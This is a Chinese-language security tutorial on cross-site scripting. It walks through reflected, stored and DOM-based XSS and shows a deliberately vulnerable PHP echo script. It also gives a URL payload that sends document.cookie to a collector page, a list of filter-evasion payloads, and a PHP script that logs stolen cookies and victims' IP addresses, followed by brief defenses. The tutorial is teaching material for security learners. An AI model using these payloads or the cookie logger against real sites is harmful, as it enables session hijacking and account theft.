# 基础漏洞系列——XSS跨站脚本攻击详解

## 简介：

XSS（跨站脚本攻击）攻击通常指的是通过利用[网页](https://baike.baidu.com/item/网页/99347)开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java、 VBScript、ActiveX、 Flash  或者甚至是普通的HTML。攻击成功后，攻击者可能得到包括但不限于更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。

## 漏洞原理实例：

对于用户提交的数据没有，后台或者JS（DOM型）没有做过滤或过滤不完全，将用户输入的信息打印出来，那么用户就可以构造特定的payload来在前端执行js语句，就造成了XSS跨站脚本攻击，下面为大家演示最简单的xss漏洞。

**后端代码（xss.php）：**

```php
<?php

$id=$_REQUEST['id'];
echo $id;

?>
```

我们把它保存在我们网站的根目录，如果用户构造如下payload，就会产生弹窗：白泽Sec

```url
http://127.0.0.1/xss.php?id=<script>alert("白泽Sec")</script>
```

![image-20210131230644583](XSS%E8%B7%A8%E7%AB%99/image-20210131230644583.png)

当然弹窗并没有什么危害，但如果用户访问的是如下url，那么就会将用户的cookie信息发送给攻击者

```
http://127.0.0.1/xss.php?id=<script>window.open("http://127.0.0.1/cookie.php?cookie='+document.cookie+'")</script>
```

这就是最简单的xss跨站脚本攻击了，黑客只需要构造好url诱使用户点击，如果用户访问了该url，那么了你的cookie就会被发送到黑客的服务器，黑客就可以使用你的身份来登录网站了，危害可想而知。

## 漏洞分类：

### 反射型：

注入的JS脚本是一次性的，不会存在于网站上，只有用户点击了特定的url后才会触发，例如上面的示例，代码：`http://127.0.0.1/xss.php?id=<script>alert("白泽Sec")</script>`，只有用户点击才会弹窗，否则不会触发

### 存储型：

注入的JS脚本是保存到网站服务器端的，比如将`<script>alert("白泽Sec")</script>`当作用户名保存到网站上，如果网站没有进行过滤，那么每当有人浏览到你的用户名，就会触发JS代码

### DOM型：

和反射型XSS较为类似，不过DOM型注入的JS脚本不经过后端的处理，也正因为如此，才和反射型xss区分开，下面举个例子讲解DOM型XSS漏洞

HTML代码：

```html
<html>
    <head>
        <title> 白泽Sec </title>
    </head>
    <body>
        <script>
            window.onload= function(){
                var p=document.getElementById("p")
                var Text=document.getElementById("text1");
                var Btn=document.getElementById("Btn");
                Btn.onclick = function(){
                    p.innerHTML = Text.value + "<br/>";
                    Text.value=""
                };
            }
        </script>
        <p id="p">白泽Sec</p>
        <input type="text" id="text1"/>
        <input id="Btn" type="button" value="提交"/>
    </body>
</html>
```

![image-20210201003155590](XSS%E8%B7%A8%E7%AB%99/image-20210201003155590.png)

在这个页面中，我们输入的数据是由前端的JS脚本控制的，直接输出在了标签p中，那么如果我们输入的值为`<img src=11 onerror=alert("白泽Sec")>`，那么会直接输出从而产生xss漏洞，如下图

![image-20210201004631909](XSS%E8%B7%A8%E7%AB%99/image-20210201004631909.png)

## 漏洞检测：

在可以提交数据的地方插入测试弹窗的代码，如果成功弹窗，即存在xss漏洞，实际情况中会存在很多情况，例如我们插入的代码输出在其他标签中，我们就需要先闭合这些标签，也有的地方会有过滤，但是有可能过滤的不完全，也会造成xss漏洞，就需要我们不断地测试。

给出一些常用的代码：

```
<script>alert(xss)</script> 
<script>alert(/xss/)</script>
'><script>alert(xss)</script> 
"><script>alert(xss)</script> 
<scr<script>ipt>alert(xss)</scr</script>ipt> 
<ScRiPt>alert(xss)</ScRiPt>
'><ScRiPt>alert(xss)</ScRiPt>
"<ScRiPt>alert(xss)</ScRiPt>
<javascript:alert(xss)>
' onfocus=javascript:alert(xss)>
"> <a href=javascript:alert('xss') > xss</a>
"> <a HrEf=javascript:alert('xss') > xss</a>
<img src=1 onerror=alert(xss)>
<Img src=1 onErrOr=AleRt(xss)>
<IMG SRC="" onerror="alert('XSS')">
<script>String.fromCharCode(97, 108, 101, 114, 116, 40, 34, 88, 83, 83, 34, 41, 59)</script> 
<svg><script>alert&#40/1/&#41</script> 
&#60;script&#62;alert(xss)&#60;/script&#62;
```

针对waf等过滤拦截自行FUZZ即可。

## 漏洞利用：

这里给出简单的利用代码

xss.php

```
<?
$cookie=$_GET['cookie'];
$referer=$_SERVER['HTTP_REFERER'];
$ip = $_SERVER['REMOTE_ADDR'];
$file=fopen('cookie.txt','a');
fwrite($file,"地址为：".$referer."\r\n"."cookie为：".$cookie."\r\n"."ip为：".$ip."\r\n"."****************************************"."\r\n");
fclose($file);
?>
```

将上面代码保存为你的网站页面，例如：127.0.0.1/xss.php，在可能出现xss的地方使用标签插入你的链接带上?cookie=document.cookie就可以了。

## 常见场景：

搜索框，个人信息栏等需要用户提交数据并返回给客户端的地方。

## 漏洞防御：

WAF拦截敏感字符

Filter，代码层面过滤敏感字符

htmlspecialchars()

Httponly